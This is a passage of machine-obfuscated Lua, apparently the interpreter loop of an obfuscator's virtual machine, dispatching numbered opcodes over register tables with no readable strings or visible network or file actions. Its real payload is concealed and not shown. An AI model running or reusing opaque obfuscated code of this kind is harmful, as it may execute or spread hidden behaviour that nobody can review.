m;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))elseif z<112 then w[y[654]]=w[y[131]]+w[y[216]];else local m;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];m=y[654];do return w[m](r(w,m+1,y[131]))end;n=n+1;y=f[n];m=y[654];do return r(w,m,p)end;end;elseif z<=113 then w[y[654]][y[131]]=y[216];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];elseif z<115 then local m;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))else local m;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))end;elseif z<=127 then if z<=121 then if z<=118 then if 116>=z then local m;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];m=y[654]w[m]=w[m](w[m+1])elseif 117==z then w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];if w[y[654]]then n=n+1;else n=y[131];end;else local m;local ba;local bb;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];bb=y[654]ba={w[bb](w[bb+1])};m=0;for bc=bb,y[216]do m=m+1;w[bc]=ba[m];end end;elseif z<=119 then local m=y[654];local ba=w[y[131]];w[m+1]=ba;w[m]=ba[w[y[216]]];elseif z>120 then for m=y[654],y[131],1 do w[m]=nil;end;else w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];if(w[y[654]]~=y[216])then n=n+1;else n=y[131];end;end;elseif z<=124 then if 122>=z then local m;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))elseif 123<z then w[y[654]]=w[y[131]][w[y[216]]];else local m=y[654];local ba,bb,bc=w[m],w[m+1],w[m+2];local ba=ba+bc;w[m]=ba;if bc>0 and ba<=bb or bc<0 and ba>=bb then n=y[131];w[m+3]=ba;end;end;elseif 125>=z then local m;local ba;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];ba=y[654];m=w[ba];for bb=ba+1,y[131]do t(m,w[bb])end;elseif 126==z then local m;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))else local m;w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))end;elseif 133>=z then if z<=130 then if z<=128 then do return end;elseif z>129 then w[y[654]]=false;n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];if(w[y[654]]~=y[216])then n=n+1;else n=y[131];end;else local m;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))end;elseif z<=131 then local m;w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];m=y[654]w[m]=w[m]()elseif 132<z then local m;local ba;local bb;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];bb=y[131];ba=y[216];m=k(w,g,bb,ba);w[y[654]]=m;else w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];if w[y[654]]then n=n+1;else n=y[131];end;end;elseif 136>=z then if z<=134 then w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;elseif z>135 then local m=y[131];local ba=y[216];local m=k(w,g,m,ba);w[y[654]]=m;else w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];if w[y[654]]then n=n+1;else n=y[131];end;end;elseif 137>=z then local m=0 while true do if m<=6 then if m<=2 then if m<=0 then w[y[654]]=w[y[131]][y[216]];else if 1<m then y=f[n];else n=n+1;end end else if m<=4 then if 4~=m then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if 5==m then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if m<=9 then if m<=7 then n=n+1;else if 8<m then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end else if m<=11 then if m~=11 then n=n+1;else y=f[n];end else if m==12 then if w[y[654]]then n=n+1;else n=y[131];end;else break end end end end m=m+1 end elseif 139>z then local m;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]]*y[216];n=n+1;y=f[n];w[y[654]]=w[y[131]]+w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]]+w[y[216]];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))else local m=y[654];do return w[m],w[m+1]end end;elseif z<=162 then if z<=150 then if z<=144 then if z<=141 then if z~=141 then do return w[y[654]]end else local m;local ba,bb;local bc;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];bc=y[654]ba,bb=i(w[bc](r(w,bc+1,y[131])))p=bb+bc-1 m=0;for bb=bc,p do m=m+1;w[bb]=ba[m];end;end;elseif z<=142 then local m,ba=0 while true do if m<=9 then if m<=4 then if m<=1 then if 1~=m then ba=nil else w={};end else if m<=2 then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else if m==3 then n=n+1;else y=f[n];end end end else if m<=6 then if 5<m then n=n+1;else w[y[654]]=j[y[131]];end else if m<=7 then y=f[n];else if m~=9 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if m<=14 then if m<=11 then if m==10 then y=f[n];else w[y[654]]=h[y[131]];end else if m<=12 then n=n+1;else if 14>m then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if m<=16 then if 15==m then n=n+1;else y=f[n];end else if m<=17 then ba=y[654]else if 19>m then w[ba]=w[ba](w[ba+1])else break end end end end end m=m+1 end elseif 143==z then w[y[654]][y[131]]=y[216];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];else h[y[131]]=w[y[654]];end;elseif z<=147 then if 145>=z then j[y[131]]=w[y[654]];elseif z<147 then local m;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];m=y[654]w[m]=w[m](w[m+1])else do return w[y[654]]end end;elseif 148>=z then w[y[654]]=false;elseif z~=150 then local m;w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];m=y[654]w[m]=w[m]()else local m;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];m=y[654]w[m]=w[m](w[m+1])end;elseif 156>=z then if 153>=z then if 151>=z then local m=y[654]w[m]=w[m](r(w,m+1,y[131]))elseif 152<z then local m=y[131];local ba=y[216];local m=k(w,g,m,ba);w[y[654]]=m;else w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];if(w[y[654]]~=y[216])then n=n+1;else n=y[131];end;end;elseif z<=154 then local m;w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];m=y[654]w[m](w[m+1])elseif z~=156 then local m;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))else local m;local ba;local bb;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];bb=y[654]ba={w[bb](w[bb+1])};m=0;for bc=bb,y[216]do m=m+1;w[bc]=ba[m];end end;elseif 159>=z then if z<=157 then local m;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))elseif 158<z then local m;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];m=y[654]w[m]=w[m](w[m+1])else w[y[654]]=w[y[131]][y[216]];end;elseif z<=160 then local m=y[654];do return w[m](r(w,m+1,y[131]))end;elseif 161<z then local m;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))else a(c,e);end;elseif z<=174 then if 168>=z then if 165>=z then if 163>=z then local m;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))elseif z>164 then local m;w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654];w[m]=w[m]-w[m+2];n=y[131];else local m;local ba;local bb;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];bb=y[654]ba={w[bb](w[bb+1])};m=0;for bc=bb,y[216]do m=m+1;w[bc]=ba[m];end end;elseif 166>=z then j[y[131]]=w[y[654]];elseif z<168 then local m;w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))else a(c,e);end;elseif 171>=z then if 169>=z then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0<a then e=nil else c=nil end else if a<=2 then m=nil else if 4~=a then w[y[654]]=h[y[131]];else n=n+1;end end end else if a<=6 then if 6>a then y=f[n];else w[y[654]]=h[y[131]];end else if a<=7 then n=n+1;else if a>8 then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end end else if a<=14 then if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if a~=14 then n=n+1;else y=f[n];end end end else if a<=16 then if 16>a then m=y[654]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if 19>a then for ba=m,y[216]do c=c+1;w[ba]=e[c];end else break end end end end end a=a+1 end elseif 170==z then w[y[654]]=y[131]*w[y[216]];else local a=y[654];w[a]=w[a]-w[a+2];n=y[131];end;elseif 172>=z then w[y[654]]=w[y[131]]*y[216];elseif z>173 then local a=y[654];local c=w[a];for e=a+1,p do t(c,w[e])end;else if(w[y[654]]<w[y[216]])then n=n+1;else n=y[131];end;end;elseif 180>=z then if z<=177 then if(z<175 or z==175)then local a,c=0 while true do if a<=14 then if a<=6 then if(a<=2)then if(a<=0)then c=nil else if a>1 then n=(n+1);else w[y[654]]=w[y[131]][y[216]];end end else if(a<=4)then if not(a==4)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if not(a~=5)then n=(n+1);else y=f[n];end end end else if(a<10 or a==10)then if a<=8 then if a~=8 then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if 10>a then y=f[n];else w[y[654]]=w[y[131]]*y[216];end end else if(a==12 or a<12)then if(a<12)then n=n+1;else y=f[n];end else if(13<a)then n=(n+1);else w[y[654]]=w[y[131]]+w[y[216]];end end end end else if a<=22 then if(a<18 or a==18)then if(a<16 or a==16)then if a==15 then y=f[n];else w[y[654]]=j[y[131]];end else if not(a~=17)then n=n+1;else y=f[n];end end else if a<=20 then if(20>a)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if not(a==22)then y=f[n];else w[y[654]]=w[y[131]];end end end else if(a<26 or a==26)then if(a<24 or a==24)then if(a==23)then n=(n+1);else y=f[n];end else if 25==a then w[y[654]]=w[y[131]]+w[y[216]];else n=n+1;end end else if(a<28 or a==28)then if(a==27)then y=f[n];else c=y[654]end else if not(29~=a)then w[c]=w[c](r(w,(c+1),y[131]))else break end end end end end a=a+1 end elseif(z~=177)then local a=y[654];do return r(w,a,p)end;else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0==a then c=nil else w[y[654]]=h[y[131]];end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if 4<a then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if a<7 then y=f[n];else w[y[654]]=y[131];end end end else if a<=11 then if a<=9 then if 8==a then n=n+1;else y=f[n];end else if 10==a then w[y[654]]=y[131];else n=n+1;end end else if a<=13 then if a<13 then y=f[n];else c=y[654]end else if 14==a then w[c]=w[c](r(w,c+1,y[131]))else break end end end end a=a+1 end end;elseif z<=178 then local a;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];a=y[654]w[a]=w[a](w[a+1])elseif z<180 then local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];e=y[654]c={w[e](w[e+1])};a=0;for m=e,y[216]do a=a+1;w[m]=c[a];end else local a;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))end;elseif z<=183 then if z<=181 then local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];e=y[654]c={w[e](w[e+1])};a=0;for m=e,y[216]do a=a+1;w[m]=c[a];end elseif 183>z then local a;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))else w[y[654]][y[131]]=y[216];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];end;elseif 184>=z then local a=y[654]w[a](w[a+1])elseif z<186 then local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];e=y[654]c={w[e](w[e+1])};a=0;for m=e,y[216]do a=a+1;w[m]=c[a];end else local a;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))end;elseif 280>=z then if(z<233 or z==233)then if(209>=z)then if 197>=z then if((191>z)or not(191~=z))then if(z==188 or z<188)then if(z>187)then local a,c=0 while true do if(not(a~=12)or a<12)then if(a<=5)then if(a==2 or a<2)then if(a==0 or a<0)then c=nil else if(1<a)then for e=0,u,1 do if(e<o)then w[e]=s[(e+1)];else break;end;end;else w={};end end else if(a<3 or a==3)then n=(n+1);else if 5>a then y=f[n];else w[y[654]]=h[y[131]];end end end else if(a<8 or not(a~=8))then if(a<6 or a==6)then n=(n+1);else if not(not(a~=8))then y=f[n];else w[y[654]]=j[y[131]];end end else if(a<=10)then if a>9 then y=f[n];else n=n+1;end else if not(11~=a)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end end end end else if(not(a~=18)or a<18)then if(a<=15)then if(a<13 or a==13)then y=f[n];else if(14<a)then n=n+1;else w[y[654]]=y[131];end end else if(a<16 or a==16)then y=f[n];else if(not(18==a))then w[y[654]]=y[131];else n=(n+1);end end end else if(a==21 or a<21)then if(a==19 or a<19)then y=f[n];else if(21>a)then w[y[654]]=y[131];else n=n+1;end end else if(a<23 or a==23)then if(22<a)then c=y[654]else y=f[n];end else if not(25==a)then w[c]=w[c](r(w,(c+1),y[131]))else break end end end end end a=(a+1)end else w[y[654]]=(w[y[131]]-w[y[216]]);end;elseif(z==189 or z<189)then local a,c=0 while true do if((not(a~=10))or(a<10))then if(a<4 or a==4)then if(a<=1)then if not(not(not(a~=0)))then c=nil else w[y[654]]=j[y[131]];end else if(a<=2)then n=(n+1);else if not(a==4)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if((a<7)or(a==7))then if((a==5)or a<5)then n=(n+1);else if(a<7)then y=f[n];else w[y[654]]=y[131];end end else if(not(not(a==8))or(a<8))then n=(n+1);else if(10>a)then y=f[n];else w[y[654]]=y[131];end end end end else if(a<15 or a==15)then if(a==12 or(a<12))then if(12>a)then n=(n+1);else y=f[n];end else if((a<13)or not(a~=13))then w[y[654]]=y[131];else if(14<a)then y=f[n];else n=(n+1);end end end else if((a<18)or not(a~=18))then if(a==16 or a<16)then w[y[654]]=y[131];else if(18>a)then n=(n+1);else y=f[n];end end else if((a<19)or not(not(a==19)))then c=y[654]else if(21>a)then w[c]=w[c](r(w,(c+1),y[131]))else break end end end end end a=(a+1)end elseif(not(z==191))then local a=y[654]local c,e=i(w[a](r(w,(a+1),y[131])))p=((e+a)-1)local e=0;for m=a,p do e=(e+1);w[m]=c[e];end;else local a=0 while true do if(a==7 or a<7)then if(a<3 or a==3)then if(a==1 or a<1)then if(a<1)then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if(3>a)then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end else if(a<5 or a==5)then if not(not(a==4))then n=(n+1);else y=f[n];end else if not(7==a)then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end else if(a<=11)then if(a<9 or not(a~=9))then if(a~=9)then y=f[n];else w[y[654]]=h[y[131]];end else if(a<11)then n=n+1;else y=f[n];end end else if(not(a~=13)or a<13)then if(12<a)then n=(n+1);else w[y[654]]=w[y[131]][y[216]];end else if(a==14 or a<14)then y=f[n];else if(a~=16)then if(w[y[654]]~=w[y[216]])then n=(n+1);else n=y[131];end;else break end end end end end a=(a+1)end end;elseif((z<194)or not(z~=194))then if(z<192 or z==192)then w[y[654]]=w[y[131]]%y[216];elseif 